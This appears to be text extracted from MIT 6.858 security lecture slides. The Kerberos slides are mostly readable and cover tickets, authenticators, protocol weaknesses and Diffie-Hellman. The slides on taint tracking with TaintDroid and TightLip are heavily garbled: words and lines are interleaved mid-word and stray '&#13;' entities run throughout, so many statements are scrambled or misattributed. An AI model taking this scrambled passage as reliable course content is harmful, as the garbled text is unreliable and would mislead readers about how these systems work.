What happens after a password change if K_c is compromised?
oCan decrypt all subsequent exchanges, s tarti ng	&#13; with initial	&#13; ticket
oCan even decrypt password	&#13; change	&#13; requests, getting the	&#13; new password!
What if
adversary figures out your old password sometime later?
oIf the adversary	&#13; saved old packets,	&#13; can decrypt	&#13; everything.
oCan	&#13; similarly obtain current password.
Forwa
rd	&#13; secrecy (avoiding the	&#13; password -change	&#13; problem).
Abstract problem: establish a shared secret between two parties.
Kerberos approach: someone picks the secret, encrypts it, and sends it.
Weakness: if the encryption	&#13; key is stolen,	&#13; can	&#13; get	&#13; the sec ret la ter.
Diffie -Hellman	&#13; key exchange protocol:
oTwo	&#13; parties	&#13; pick their	&#13; own	&#13; parts	&#13; of a secret.
oSend messages to each other.
oMessages do not have to be secret, just authenticated (no tampering).
oTwo parties use each other's messages to reconstruct shared ke y.
oAdversary cannot reconstruct key by watching network messages.
6</text>
        </slide>
        <slide>
          <slideno>0</slideno>
          <text>6.858 Lecture 13
Kerber
os
Administrivia	&#13; 
Quiz review	&#13; today	&#13; (Actual  quiz next  Wednesday. ) 
Post your  final project idea by tomorrow.
Kerberos settin
g:	&#13; 
Distributed architecture, evolved from a single time-sharing system.
Many servers providing	&#13; services: remote login, mail, printing, file server.
Many workstations, some are public, some are private.
Each user logs into their own workstation,	&#13; has root	&#13; access.
Adversary may have his/her own workstation too.
Alternatives at the time: rlogin, rsh.
Goal:	&#13; allow users to access services,	&#13; by authenticating to servers.
Other user information distributed via Hesiod,	&#13; LDAP, or some other directory.
Widely used: Microsoft Active Directory uses the Kerberos (v5) protocol
What's the trust
model?
All users, clients, servers	&#13; trust the	&#13; Kerberos	&#13; server.
No apriori trust between any other pairs of machines.
Network is not trusted.
User trusts the local machine.
Kerbe
ros architecture:
Central Kerberos	&#13; server, trusted	&#13; by	&#13; all parties	&#13; (or at least all at MIT).
Users,  server s have a private key shared  between  them and Kerberos.
Ker
beros server keeps track	&#13; of everyone's private key.
Kerberos uses keys to achieve mutual *authentication* between client, server.
oTerminology: user, client, server.
oClient and	&#13; server know each	&#13; other's names.
oClient is convinced	&#13; it's	&#13; talking to	&#13; server and	&#13; vice -versa.
Kerberos
does not provide authorization (can user access some resource).
oIt's the application's job to decide	&#13; this.
Why
do we need this trusted Kerberos server?
Users  don't need  to	&#13; set up accounts,	&#13; passwords,	&#13; etc	&#13; on	&#13; each server.
1</text>
        </slide>
        <slide>
          <slideno>2</slideno>
          <text>oFor servers (assuming not on any ACL):	&#13; ensure users forget server name.
oMust	&#13; change the key,	&#13; to ensure old tickets not	&#13; valid for new	&#13; server.
Getting	&#13; the	&#13; initial ticket.
"Kerberos"	&#13; protocol:
oClient	&#13; sends pair of principal names (c, s), where s is typically tgs.
oServer responds	&#13; with { K_{c,s},	&#13; { T_{c,s}	&#13; }_{K_s}	&#13; }_{K_c}
How does t
he	&#13; Kerberos	&#13; server authenticate	&#13; the	&#13; client?
oDoesn't need	&#13; to	&#13; -- willing	&#13; to respond to any request.
How does the	&#13; client authenticate	&#13; the	&#13; Kerberos	&#13; server?
oDecrypt the	&#13; response	&#13; and	&#13; check if the	&#13; ticket looks	&#13; valid.
oOnly the Kerberos server wou ld	&#13; know K_c.
In what ways is this better/worse	&#13; than sending	&#13; password to server?
oPassword	&#13; doesn't get sent over network,	&#13; but easier to	&#13; brute -force.
Why is
the key included twice in the response from Kerberos/TGS server?
oK_{c,s}	&#13; in	&#13; response gives t he	&#13; client a ccess	&#13; to	&#13; this	&#13; shared	&#13; key.
oK_{c,s} in the ticket should convince server the key is legitimate.
General weakness: Kerberos
4 assumed encryption provides message integrity.
There were some attacks where adversary can tamper with ciphertext.
No explicit	&#13; MAC means that no well-defined	&#13; way to detect tampering.
One-off	&#13; solutions: kprop protocol included checksum, hard to match.
The weakness made it relatively easy for adversary to "mint" tickets.
Ref:  http://web.mit.edu/kerberos/advisories/ MITKRB5-SA-2003-004-krb4.txt
General weakness: adversary can mount offline password-guessing	&#13; attacks.
Typical passwords	&#13; don't have	&#13; a lot of entropy.
Anyone can ask KDC for a ticket encrypted with user's password.
Then try	&#13; to	&#13; brute-force	&#13; the	&#13; user's	&#13; password	&#13; offline:	&#13; e asy	&#13; to paralle lize.
Better design: require client to interact with server for each login attempt.
General weakness:	&#13; DES hard -coded	&#13; into the design, packet format.
Difficult to switch to another cryptosystem when DES became too weak.
DES key	&#13; space	&#13; is too	&#13; s mall:	&#13; keys are only 56 bits, 2^56 is not that big.
Cheap	&#13; to break DES these days ($20--$200  via https://www.cloudcracker.com/ ).
How could	&#13; an adversary	&#13; break Kerberos	&#13; give	&#13; this	&#13; weakness?
Authenticating to a server.
"TGS" protocol:
oClient sends	&#13; ( s, {T_{c,tgs}}_{K_tgs}, {A_c}_{K_{c,tgs}} )
oSer
ver replies	&#13; with { K_{c,s},	&#13; { T_{c,s}	&#13; }_{K_s}	&#13; }_{K_{c,tgs}}
How does a
server authenticate	&#13; a client based	&#13; on the	&#13; ticket?
oDecrypt ticket using server's key.
oDecrypt authenticator	&#13; using K_{c,s}.
oOnly Kerberos serve r	&#13; coul d	&#13; have	&#13; generated	&#13; ticket (knew K_s).
3</text>
        </slide>
        <slide>
          <slideno>6</slideno>
          <text>Diffie -Hellman	&#13; details:
oPrime p, generator g mod p.
oAlice and Bob each pick a random, secret exponent (a and b).
oAlice and Bob send (g^a mod p) and (g^b mod p) to each other.
oEach party	&#13; computes (g^(ab) mod p) = (g^a^b mod p) = (g^b^a mod p).
oUse (g^(ab) mod p) as secret key.
oAssume discrete log (recovering a from (g^a mod p)) is hard.
Cross-realm	&#13; in Kerberos.Shared keys between realms.
Kerberos v4 only supported pairwise cross -realm	&#13; (no	&#13; tra
 nsiting).
What	&#13; doesn't	&#13; Kerberos address?Client,	&#13; server, or KDC machine can be compromised.
Access control or groups (up to service to implement that).
Microsoft	&#13; "extended"	&#13; Kerberos to support	&#13; groups.
oEffectively	&#13; the user's list	&#13; of groups was include d	&#13; in
 ticket.
Proxy problem: still no great solution in Kerberos, but ssh-agent	&#13; is nice.
Workstation	&#13; security (can	&#13; trojan	&#13; login,	&#13; and did happen	&#13; in	&#13; practice).
oSmartcard-base d approach hasn't	&#13; taken	&#13; off.
oTwo-step	&#13; authentication (time-based OTP) used by Google Authenticator.
oShared  desktop systems  not so prevalent: everyone  has own phone,
laptop,	&#13; ..
Fol
low-
ons.
Kerberos v5 fixes many problems in v4 (some mentioned), used widely (MS AD).
OpenID is a similar-looking	&#13; protocol	&#13; for authentication	&#13; in	&#13; web	&#13; applications .
oSimilar messages  are passed  around via HTTP	&#13; requests .
7</text>
        </slide>
        <slide>
          <slideno>1</slideno>
          <text>Overall architecture diagram
+-----------------------+ 
c, tgs | |

[ User: Kc ] &lt;--------&gt; [ Kerberos ] |
^ \  | Database: |
| \  | c: Kc |
V \ s | s: Ks |
[ Server: Ks ] \--------&gt;  [ TGS ] |
| KDC |
+-----------------------+ 
Basic Kerberos constructs from the paper:
Ticket, T_{c,s} = { s, c, addr, timestamp, life, K_{c,s} }
[ usually encrypted w/ K_s ]
Authenticator, A_c = { c, addr, timestamp }

[ usually encrypted w/ K_{c,s} ]
Kerberos protocol mechanics.
 Two	&#13; interfaces	&#13; to	&#13; the	&#13; Kerberos	&#13; database:	&#13; "Kerberos"	&#13; and	&#13; "TGS" protocols.
 Quite similar; few differences:
o In Kerberos protocol,	&#13; can specify	&#13; any c, s; cli ent	&#13; must know K_c.
o In TGS protocol, client's name is implicit (from ticket).
o Client just needs	&#13; to	&#13; know K_{c,tgs} to	&#13; decrypt response	&#13; (not K_c).

 Where does the client machine get K_c in the first place?
o For users, derived from a password using, effectively, a hash function.
 Why do we need these two protocols?	&#13;  Why not	&#13; just	&#13; use "Kerberos"	&#13; protocol?
o Client	&#13; machine can forget user password after it gets TGS ticket.
o Can we	&#13; just store	&#13; K_c	&#13; and	&#13; forget the	&#13; user	&#13; password? Password -
equiva
lent.
Naming. Critical to	&#13; Ke rberos:	&#13; mapping between
 keys and principal names.
 Each principal name consists of ( name, instance, realm )
o Typically written name.instance@realm

 What	&#13; entities have principals?
o Users: name is username, instance for special privileges (by convention).
o Servers: name is service name, instance is server's hostname.
o TGS: name is 'krbtgt', instance is realm name.

 Where are these names used / where do the names matter?
o Users remember their user name.
o Servers perform access control based on principal name.
o
	 Clients	&#13; choose a principal they	&#13; expect to	&#13; be	&#13; talking	&#13; to.
Similar
to browsers expecting specific certificate name for HTTPS	&#13; 
 When can a name be reused?
o For user names: ensure no ACL	&#13; contains that name, difficult.
2</text>
        </slide>
        <slide>
          <slideno>3</slideno>
          <text>oOnly client	&#13; could have generated authenticator (knew	&#13; K_{c,s}).
Why does the ticket	&#13; include c?	&#13;  s?	&#13;  addr?	&#13;  life?
oServer can extract client's principal name from ticket.
oAddr tries to prevent stolen ticket from being used on another machine.
oLifetime similarly tries to limit damage from stolen ticket.
How does a network protocol use	&#13; Kerberos?
oEncrypt/authenticate all messages with K_{c,s}
oMail server commands, documents sent to printer, shell I/O, ..
oE.g., "DELETE	&#13; 5"	&#13; in a mail server protocol.
Who
generates the authenticator?
oClient, for each	&#13; new connection.
Why
does a client	&#13; need to send an authenticator,	&#13; in	&#13; addition	&#13; to the ticket?
oProve to the server that an adversary is not replaying an old message.
oServer must keep last few authenticators in memory, to detect replays.
How	&#13; does
Kerberos use time? What happens if the clock is wrong?
oPrevent stolen tickets from being used forever.
oBound size of replay	&#13; cache.
oIf clock is wrong,	&#13; adversary	&#13; can use	&#13; old tickets or replay	&#13;  messages.
How	&#13; does
client authenticate server? Why would it matter?
oConnecting	&#13; to file server: want to know you're getting legitimate files.
oSolution: send  back  { timestamp  + 1 }_{K_{c,s}}.
General weakness: same key, K_{c,s}, used for many things
Adversary can
substitute any msg encrypted with K_{c,s} for any other.
Example: messages across multiple sessions.
oAuthenticator does not attest to K_{c,s} being fresh!
oAdversary can splice fresh authenticator with old message
oKerberos v5 uses fresh session	&#13; key each time, sent in authenticator
Example: messages in different directions
oKerberos v4 included a direction	&#13; flag	&#13; in	&#13; packets (c -&gt;s	&#13;  or s-&gt;c)
oKerberos v5 used separate keys: K_{c -&gt;s} ,	&#13; K_{s -&gt;c}
What	&#13; if users connect to wrong	&#13; server (analogue of MITM	&#13; / phishin g	&#13; attack)?
If server is intercepting	&#13; packets,	&#13; learns what service	&#13; user connects to.
What if user accidentally types ssh malicious.server?
oServer learns user's principal name.
oServer does not get user's	&#13; TGS ticket or K_c.
oCannot	&#13; impersonate user to others.
What	&#13; h
appens if the KDC is down?
Cannot log in.
Cannot obtain new tickets.
Can keep using existing tickets.
Authenticating to a
Unix system.
4</text>
        </slide>
      </slides>
      <videos>
        <video>
          <video_url>https://ocw.mit.edu/courses/6-858-computer-systems-security-fall-2014/resources/lecture-14-ssl-and-https/</video_url>
          <video_title>Lecture 14: SSL and HTTPS</video_title>
          <transcript/>
        </video>
      </videos>
    </lecture>
    <lecture>
      <lecture_title>Data Tracking (PDF)</lecture_title>
      <lecture_pdf_url>https://ocw.mit.edu/courses/6-858-computer-systems-security-fall-2014/resources/mit6_858f14_lec21/</lecture_pdf_url>
      <lectureno>21</lectureno>
      <slides>
        <slide>
          <slideno>4</slideno>
          <text>o Ref:	&#13; 
http://www.ssrg.nicta.com.au/publications/papers/Slowinska_Bos_09.p
	&#13; df	&#13; 
	&#13; Q:
o	&#13; T
kai
A:	&#13; This	&#13; might	&#13; work	&#13; as	&#13; a	&#13; heuristic,	&#13; but	&#13; it's	&#13; lo
 	&#13; for	&#13; nt	&#13; 
vatracking	&#13; seems	&#13; expensive---
lues	&#13; that	&#13; are	&#13; known	&#13; to	&#13; be	&#13; can't
sensit	&#13; w
ive?e	&#13; just	&#13; examine	&#13; inputs	&#13; and	&#13; outputs	&#13; to	&#13; 
easy	&#13; for	&#13; a	&#13; 
formats,	&#13; etc.	&#13; There	&#13; are	&#13; many	&#13; ways	&#13; to	&#13; encode	&#13; data,	&#13; e.g.,	&#13; URL -quotn	&#13; adversa
ing,	&#13; binarry	&#13; to	&#13; get
y	&#13; ver	&#13; a
susround	&#13; it
	&#13; text	&#13; .	&#13; 
	&#13; 
As	&#13; described,	&#13; taint	&#13; tracking	&#13; cannot	&#13; detect	&#13; implicit	&#13; flows.	&#13; 
 
 Implicit	&#13; flows	&#13; happen	&#13; when	&#13; a	&#13; tainted
directly	&#13; assigning	&#13; to	&#13; that	&#13; variable. 	&#13; 	&#13; value	&#13; affects	&#13; another	&#13; variable	&#13; without 	&#13; 
if(imei &gt; 42){  
x = 0; 
}else{ x = 1; 
} 
 
 
 Instead
	&#13; netwo	&#13; of	&#13; a
Implicit	&#13; flows	&#13; often	&#13; arise	&#13; because	&#13; of	&#13; the
o rk!ssigning	&#13; t
	&#13; o	&#13; x,	&#13; we	&#13; could 	&#13; try	&#13; to	&#13; leak	&#13; information	&#13; about	&#13; the	&#13; IMEI	&#13; over	&#13; 
Can	&#13; try	&#13; to	&#13; catch	&#13; implicit	&#13; flows	&#13; tainte
it	&#13; with	&#13; taint	&#13; of 	&#13; branch	&#13; test,	&#13; andby
	&#13; as	&#13; asd	&#13; values	&#13; affecting	&#13; contr
signisigni
ng	&#13; Png	&#13; a	&#13; tai
C	&#13; taint	&#13; tont	&#13; tag	&#13; to
	&#13; value	&#13; th
seo
	&#13; i	&#13; l	&#13; f
nsPC,	&#13; updatlow.	&#13; 
ing	&#13; 
if(imei &gt; 42){	&#13; clauses,	&#13; b
 ut	&#13; this	&#13; can	&#13; lead	&#13; to	&#13; a	&#13; lot	&#13; of	&#13; false	&#13; positives.	&#13; Ex: 	&#13; ide	&#13; if -else	&#13; 
x = 0; 
}else{ 
x = 0;
} 
 
information	&#13; The	&#13; t 
aint	&#13; track
flower	&#13; t
!	&#13; hinks	&#13; that 	&#13; x	&#13; should	&#13; be	&#13; tagged	&#13; with	&#13; imei's	&#13; taint,	&#13; but	&#13; there	&#13; is	&#13; no	&#13; 
	&#13; 
	&#13; 
Inter
 
 Often	&#13; want	&#13; to	&#13; make	&#13; sure	&#13; sensitive	&#13; data	&#13; (keys,	&#13; passwords)	&#13; is	&#13; erased	&#13; promptly.	&#13; esting	&#13; application	&#13; of	&#13; taint	&#13; tracking: 	&#13; keeping	&#13; track	&#13; of	&#13; data	&#13; copies. 	&#13; 
If	&#13; we're	&#13; not	&#13; worried	&#13; about	&#13; performance,	&#13; 
see	&#13; 
ohow
 	&#13; sensitive	&#13; information	&#13; flows	&#13; through	&#13; a	&#13; machine.	&#13; we	&#13; can	&#13; use	&#13; x86-level	&#13; taint	&#13; tracking	&#13; to 	&#13; 
 Basic	&#13; idea:	&#13; CRef:	&#13; http://www
reate	&#13; an	&#13; x86	&#13; simulator	&#13; that	&#13; -cs-students.stanf
into
 system	&#13; (OS	&#13; +	&#13; applications).	&#13; erpretrd.edu/~blp/tai
s	&#13; each	&#13; x86	&#13; instntboc
rucths.pd
ion	&#13; in	&#13; af	&#13; 
	&#13; full	&#13; 
You'll	&#13; find	&#13; that	&#13; software	&#13; often	&#13; keeps	&#13; data 	&#13; for	&#13; longer	&#13; than	&#13; necessary.	&#13; For	&#13; 
example,	&#13; ke
ystroke	&#13; data	&#13; stays	&#13; around	&#13; in: 	&#13; 
5
5</text>
        </slide>
        <slide>
          <slideno>6</slideno>
          <text>Limitations	&#13; of	&#13; 
o Scrubbers	&#13; are	&#13; in	&#13; the	&#13; trusted	&#13; computing	&#13; 
 Tightlip	&#13; 
 They	&#13; have	&#13; to	&#13; catch	&#13; all	&#13; instances 	&#13; of	&#13; sensitbase.	&#13; 
ive	&#13; data.	&#13; 
o If	&#13; a	&#13; doppelgangerdoppelganger	&#13; might	&#13; crash	&#13; on	&#13; They	&#13; also	&#13; have	&#13; to	&#13; generate 	&#13; reasonable	&#13; dummy	&#13; data---otherwise,	&#13; a	&#13; 
system	&#13; call	&#13; divergence	&#13; occurs,	&#13; Tight	&#13; reads	&#13; sensitive	&#13; datail
	&#13; from	&#13; multiple	&#13; sources,	&#13; and	&#13; a	&#13; l-formed	&#13; inputs!	&#13; 
	&#13; lip	&#13; can't 	&#13; tell	&#13; why. 	&#13; 
TaintDroid	&#13; and	&#13; Tightlip	&#13; assume	&#13; no	&#13; assistance	&#13; from	&#13; the	&#13; developer	&#13; .	&#13; .	&#13; .	&#13; but	&#13; what	&#13; if	&#13; 
devel
int {Alice --&gt; Bob} x;  //Means that x is controlled	&#13; opers	&#13; were	&#13; willng	&#13; to	&#13; explicitly	&#13; add	&#13; taint	&#13; labels	&#13; to	&#13; their 	&#13; code?	&#13; 
 
         //by the principal Alice, who 
	&#13;          //allows that data to be seen 
         //by Bob. 
 
 	&#13; Input	&#13; channels:	&#13; The	&#13; read	&#13; values	&#13; get	&#13; the	&#13; label 	&#13; of	&#13; the	&#13; channel.	&#13; 
Output	&#13; channels:	&#13; Labels	&#13; on	&#13; the	&#13; channel	&#13; must	&#13; match	&#13; a	&#13; label	&#13; on	&#13; the	&#13; value	&#13; being	&#13; 
	&#13; 
 written.	&#13; 
Static	&#13; (i.e.,	&#13; compile-time)	&#13; checking	&#13; can	&#13; catch	&#13; many	&#13; bugs	&#13; involving	&#13; inappropriate	&#13; 
data
o	&#13; fl
 ow
Loosels.	&#13; 
o reasony	&#13; 
Static	&#13; checks	&#13; are	&#13; much	&#13; better	&#13; than	&#13; dynamic	&#13; 	&#13; asp
bouea
tk
.	&#13; ing,	&#13; labels	&#13; are	&#13; like	&#13; strong 	&#13; types	&#13; which	&#13; the	&#13; compiler	&#13; can	&#13; 
 For	&#13; more	&#13; details,	&#13; see	&#13; the	&#13; Jif	&#13; paper:	&#13; their	&#13; absence) 	&#13; can	&#13; be	&#13; a	&#13; covert	&#13; channelcheck
http://pmg.csail.mit.edu/papers/iflow-!	&#13; s:	&#13; runtime	&#13; failures	&#13; (or	&#13; 
sosp97.pdf 	&#13; 
7
7</text>
        </slide>
        <slide>
          <slideno>1</slideno>
          <text>Ex:	&#13; network.	&#13; 
t
 Ta
distint
inctDroid	&#13; uses	&#13; a
	&#13;  aint 

 	&#13; sources.	&#13; 32-
	&#13; bit	&#13; bitvector	&#13; to 	&#13; represent	&#13; taint,	&#13; so	&#13; there	&#13; can	&#13; be	&#13; at	&#13; most	&#13; 32	&#13; 
	&#13; 
int lat = gps.getLatitude();Roughly	&#13; speaking,	&#13; taint	&#13; flows	&#13; from	&#13; rhs	&#13; to	&#13; lhs	&#13; of	&#13; assignments.	&#13; 
 
//The lat variable is now
Da	&#13; 
lvik	&#13; VM	&#13; is	&#13; a	&#13; register -based	&#13; machine,	&#13; so	&#13; taint	&#13; assignment	&#13; happens	&#13; during	&#13; the	&#13;  tainted! 
ex
	&#13; 
move_op dst src          //dst receives src's taintecution	&#13; of	&#13; Dalvik	&#13; opcodes	&#13; [see	&#13; Table	&#13; 1].	&#13; 
 
binary_op dst src0 src1  //dst receives union of src0
	&#13;  
	&#13; Inter
char c = //. . . get c somehow.esting	&#13; special	&#13; case:	&#13; ar       //and src1's taint
rays	&#13;  
 
char uppercase[] = ['A', 'B', 'C', . . .]; 
char upperC = uppercase[c]; 
//upperC's taint is the 
//union of c and uppercase's 
To	&#13; minimize	&#13; storage	&#13; overheads,	&#13; an	&#13; array	&#13; 	&#13; //taint. 
elements	&#13; have	&#13; the	&#13; same	&#13; taint	&#13; tag.	&#13; receives	&#13; a	&#13; single	&#13; taint	&#13; tag,	&#13; and	&#13; all	&#13; of 	&#13; its	&#13; 
Q:	&#13; Wh	&#13; 
A:	&#13; It	&#13; should	&#13; be	&#13; safe	&#13; to	&#13; *over*-estimate	&#13; y	&#13; is	&#13; it	&#13; safe	&#13; to	&#13; associate	&#13; just	&#13; one 	&#13; label	&#13; with	&#13; arrays	&#13; or	&#13; IPC	&#13; messages?	&#13; 
	&#13; false	&#13; negatives.	&#13; taint.	&#13; This	&#13; may	&#13; lead	&#13; to	&#13; false	&#13; positives,	&#13; but	&#13; not	&#13; 
	&#13; 
Another	&#13; special	&#13; case:	&#13; native	&#13; methods
System.arraycopy(),	&#13; and	&#13; native	&#13; code	&#13; 
 ex	&#13; (i.e.,	&#13; internal	&#13; V
posed	&#13; viaM	&#13; methods	&#13; like	&#13; 
 can't	&#13; automatically	&#13; Problem:	&#13; Native	&#13; code	&#13; doesn't	&#13; go	&#13; 
propagate	&#13; taint!thr
	&#13; ough	&#13; the	&#13; D	&#13; JNI).
alvi	&#13; 
k	&#13; interpreter,	&#13; so 	&#13; TaintDroi d	&#13; 
Solution:	&#13; Manually	&#13; analyzbeh
oav
 ior.	&#13; e	&#13; the 	&#13; native	&#13; code,	&#13; provide	&#13; a	&#13; summary	&#13; of	&#13; its	&#13; taint	&#13; 
	&#13; 
o Effectively,	&#13; need	&#13; to	&#13; specify 	&#13; how	&#13; to	&#13; copy	&#13; taints	&#13; from	&#13; args	&#13; to	&#13; return	&#13; values. 	&#13; 
o Q:
A:	&#13; Authors	&#13; argue	&#13; this	&#13; 	&#13; How	&#13; well	&#13; does	&#13; this	&#13; s
wocale
rks?
arraycopy)	&#13; OK	&#13; 
	&#13; for	&#13; internal	&#13; VM	&#13; functions 	&#13; (e.g.,	&#13; 
retintegers
urn	&#13; va	&#13; or	&#13; st.	&#13; F
rings	&#13; aor	&#13; "eas
re	&#13; pay"	&#13; cal
ssed,	&#13; als,	&#13; the	&#13; anal
ssignysis	&#13; can	&#13; b
	&#13; 
	&#13; lue.	&#13; the	&#13; union	&#13; oe	&#13; automated---
f	&#13; the	&#13; input	&#13; taiif	&#13; onl
nts	&#13; toy	&#13; 
	&#13; the	&#13; 
2
2</text>
        </slide>
        <slide>
          <slideno>5</slideno>
          <text>o 
o 
o Ke
Kernel's	&#13; random	&#13; number	&#13; generatoryboard	&#13; device	&#13; driver's	&#13; buffers 	&#13; 
o 
o X	&#13; s
Kere
nerver's	&#13; e	&#13; 
o tty	&#13; buffers	&#13; for	&#13; terminal	&#13; apps	&#13; l	&#13; sockeve
t/pint	&#13; que
pe	&#13; bufue	&#13; 
fers	&#13; used	&#13; to 	&#13; pass	&#13; messages	&#13; containing	&#13; keystroke	&#13; 
.	&#13; .	&#13; .	&#13; etc	&#13; .	&#13; .	&#13; .
	&#13; 	&#13; 	&#13; 
VMTaint
---the	&#13; VDroid	&#13; det
M	&#13; must	&#13; implement	&#13; taint	&#13; tags.	&#13; Cects	&#13; leaks	&#13; of	&#13; sensitive	&#13; data, 	&#13; 
an	&#13; we	&#13; track	&#13; sensitive	&#13; information	&#13; leaks	&#13; but	&#13; requires	&#13; language	&#13; support	&#13; for	&#13; the	&#13; Java 	&#13; 
wi
C	&#13; 
 or	&#13; thout 	&#13; support	&#13; from	&#13; a	&#13; managed	&#13; runtime?	&#13; What	&#13; if	&#13; we	&#13; want	&#13; to	&#13; detect	&#13; leaks 	&#13; in	&#13; legacy	&#13; 
One
system.	&#13; C++	&#13; appli
achcatio
o	&#13; appr
 o :	&#13; usns
e?
	&#13; d	&#13; 
oppelganger	&#13; processes 	&#13; as	&#13; introduced	&#13; by	&#13; the	&#13; TightLip	&#13; 
 Ref:	&#13; htendi/yumerefendi.pdf	&#13; tps://www.usenix.org/legacy/event/nsdi07/tech/full_pap ers/yumeref
Step	&#13; 1:	&#13; Per
looks	&#13; for	&#13; sensitive	&#13; information	&#13; like	&#13; mail	&#13; files,	&#13; word	&#13; processing	&#13; documents,	&#13; 
o iodically,	&#13; Tightlip	&#13; runs	&#13; a 	&#13; daemon	&#13; which 	&#13; scans	&#13; a	&#13; user's	&#13; file	&#13; system	&#13; and	&#13; 
o For	&#13; shadoweach	&#13; of	&#13; these	&#13; files,	&#13; Tightlip	&#13; generates	&#13; a	&#13; shadow	&#13; veretc.	&#13; 
Tightlip	&#13; a	&#13; version	&#13; 
ssociatis
es	&#13; ea	&#13; non
ch	&#13; t-sensit
ype	&#13; ofive,	&#13; 
	&#13; sensitand	&#13; contsion	&#13; of	&#13; the
ive	&#13; filains
e	&#13; w	&#13; scru
ith	&#13; ab
	&#13; spbed	&#13; 
eciada
lizedta.	&#13; 	&#13; file.	&#13; The	&#13; 
Ex:	&#13; email	&#13; scrubber	&#13; overwrites	&#13; to:	&#13; and	&#13; from:	&#13; fields	&#13; with	&#13; an	&#13; equiv	&#13; scru
 number	&#13; of	&#13; dummy	&#13; characters.	&#13; alent	&#13; bber.	&#13; 
 Step	&#13; 2:	&#13; At	&#13; some	&#13; point	&#13; later,	&#13; a	&#13; processsensitive	&#13; data.	&#13; If	&#13; it	&#13; touches	&#13; sensitive 	&#13; da	&#13; st
ta
arts	&#13; executing.	&#13; Initially,	&#13; it	&#13; touches
proces
o s.	&#13; ,	&#13; then	&#13; Tightlip	&#13; spawns	&#13; a	&#13; doppelga	&#13; no
nger	&#13; 
	&#13; 
The	&#13; doppel
  Inherits	&#13; most	&#13; state	&#13; from	&#13; the	&#13; ganger	&#13; is	&#13; a	&#13; sandboxed	&#13; version	&#13; of	&#13; t
originahe	&#13; original	&#13; process.	&#13; 
o l	&#13; process	&#13; 
o calTight
ls	&#13; tl
hatip	&#13; lbut	&#13; r
ets	&#13; the	&#13; tead
ws	&#13; the	&#13; scrubbed 	&#13; data	&#13; instead	&#13; of	&#13; sensitive	&#13; da ta	&#13; 
If	&#13; the	&#13; doppelganger	&#13; makes	&#13; the	&#13; same	&#13; system	&#13; calls	&#13; with	&#13; the	&#13; same	&#13; 	&#13; the	&#13; two 	&#13; processes	&#13; make.	&#13; o	&#13; processes 	&#13; run	&#13; in	&#13; parallel,	&#13; and	&#13; observes 	&#13; the	&#13; system	&#13; 
 arguments	&#13; as	&#13; the	&#13; original	&#13; process,	&#13; 
do	&#13; not	&#13; d epend	&#13; on	&#13; sensitive 	&#13; data. 	&#13; then	&#13; with	&#13; high	&#13; probability,	&#13; the 	&#13; outputs	&#13; 
Step	&#13; 3:	&#13; If	&#13; the	&#13; system	&#13; calls	&#13; diverge,	&#13; and	&#13; the	&#13; doppelganger	&#13; tries	&#13; to	&#13; make	&#13; a	&#13; 
call,	&#13; Tight
o At	&#13; this	&#13; point,	&#13; Tightlip	&#13; or	&#13; the	&#13; userlip	&#13; flags	&#13; a	&#13; potential	&#13; leak	&#13; of	&#13; sens
	&#13; can	&#13; terminate	&#13; the	&#13; process,	&#13; fail	&#13; the	&#13; itive	&#13; data.	&#13; network	&#13; 
	&#13; 
 network	&#13; write,	&#13; or	&#13; do 	&#13; something	&#13; else.	&#13; 
Nice	&#13; 
o 
o things	&#13; 
Worksab
	&#13; wiou
tht	&#13; Tight
	&#13; legaclip
oRequires	&#13; minor	&#13; changes	&#13; to	&#13; standard	&#13; OSes	&#13; to	&#13; compare	&#13; order	&#13; of	&#13; system	&#13; y	&#13; appli:	&#13; 
cations 	&#13; 
 calls	&#13; and	&#13; their	&#13; arguments	&#13; Low	&#13; overhead	&#13; (basically,	&#13; the	&#13; overhead	&#13; of	&#13; running	&#13; an	&#13; additional	&#13; process) 	&#13; 
6
6</text>
        </slide>
        <slide>
          <slideno>3</slideno>
          <text>Sending	&#13; location	&#13; data	&#13; to	&#13; adver
	&#13; o 
oSending	&#13; a	&#13; user's	&#13; phone	&#13; number	&#13; to	&#13; tiser
ths	&#13; 
e	&#13; app	&#13; servers	&#13; 
TaintDroid's	&#13; rules	&#13; for	&#13; information	&#13; flow	&#13; might	&#13; lead	&#13; resu
 
 Imagine	&#13; that	&#13; an	&#13; application	&#13; implements	&#13; its	&#13; lts.	&#13; to	&#13; counterintuitive/interesting	&#13; 
class ListNode{ own	&#13; linked	&#13; list	&#13; class.	&#13; 	&#13; 
Object data; 
ListNode next; } 
 	&#13; 
Suppose	&#13; 
calculat e	&#13; th
that	&#13; th
e	&#13; lengthe	&#13; appli
	&#13; of	&#13; thcati
e	&#13; lion	&#13; as
st,	&#13; iss
	&#13; thigns
e	&#13; le	&#13; tai
ngthnte
	&#13; vd	&#13; 
aluevalues	&#13; t
	&#13; tainteo	&#13; the	&#13; "data"	&#13; fiel
	&#13; d?	&#13; d.	&#13; If	&#13; we	&#13; 
 Adding	&#13; to	&#13; a	&#13; linked	&#13; list	&#13; involves:	&#13; 1)
2)  Allocating	&#13; a	&#13; ListNode	&#13; 
3) 
 Assigning	&#13; to	&#13; the	&#13; "data"	&#13; field	&#13; 
NotPat
e	&#13; thching	&#13; up	&#13; "nex
meaning	&#13; that	&#13; counting	&#13; the	&#13; number	&#13; of	&#13; elements	&#13; in	&#13; the	&#13; list	&#13; would	&#13; not	&#13; generate	&#13; at	&#13; Step	&#13; 3	&#13; doest"	&#13; point
n't	&#13; invoers
lve	&#13; 
	&#13; tainted 	&#13; data!	&#13; So,	&#13; "next"	&#13; pointers	&#13; are	&#13; tainted, 	&#13; 
tainted	&#13; value	&#13; for	&#13; length.a	&#13; 
	&#13; 	&#13; 
	&#13; 
 
What	&#13; are	&#13; the	&#13; performance	&#13; overheads	&#13; of	&#13; TaintDroid?	&#13; 
 
 Additional	&#13; memory	&#13; to	&#13; stor
Additional	&#13; CPU	&#13; cost	&#13; to	&#13; assign,	&#13; propagate,	&#13; e	&#13; taint	&#13; tags.	&#13; 
Overheads	&#13; seem	&#13; to	&#13; be	&#13; moderate:	&#13; ~3
	&#13; --5%	&#13; memory	&#13; overhead,	&#13; 3check	&#13; taint	&#13; tags.	&#13; 
 overhead--29%	&#13; CPU	&#13; 
However,	&#13; on	&#13; phones,	&#13; users	&#13; are	&#13; very 	&#13; concerned	&#13; about	&#13; battery	&#13; life:	&#13; 29% 	&#13; less	&#13; CPU	&#13; 
Q:	&#13; performance	&#13; may	&#13; be	&#13;  tolerable, 	&#13; but	&#13; 29%	&#13; less	&#13; battery 	&#13; life	&#13; is	&#13; bad.	&#13; 
